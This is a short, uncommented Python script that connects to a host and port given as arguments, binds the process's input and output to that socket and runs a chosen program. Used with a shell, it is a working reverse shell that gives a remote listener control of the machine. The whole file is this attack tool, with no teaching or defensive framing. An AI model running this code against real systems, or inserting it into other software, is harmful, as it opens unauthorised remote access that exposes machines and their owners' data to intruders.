#!/usr/bin/env python

import socket
import os
from sys import argv

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((argv[1], int(argv[2])))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.close(s.fileno())
os.execvp(argv[3], argv[3:])
